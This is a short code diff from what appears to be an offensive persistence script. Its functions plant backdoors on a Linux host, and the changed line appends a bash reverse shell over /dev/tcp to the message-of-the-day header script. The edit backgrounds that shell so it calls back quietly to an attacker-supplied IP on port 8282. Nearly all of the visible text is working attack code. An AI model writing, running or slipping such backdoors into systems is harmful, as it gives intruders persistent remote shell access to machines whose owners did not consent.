@@ -22,7 +22,7 @@ def backDoorBashRC():
 
 def backDoorMessageOfTheDay(ip):
 	with open('/etc/update-motd.d/00-header', 'a') as headerFile:
-		headerFile.write(f'bash -c "bash -i >& /dev/tcp/{ip}/8282 0>&1"') #update the ip and port accordingly
+		headerFile.write(f'bash -c "bash -i >& /dev/tcp/{ip}/8282 0>&1"&') #update the ip and port accordingly
 
 def main():
 	attackBoxIP = sys.argv[1] #first command line argument is the ip of teh box you want to set the reverse shells to connect back to
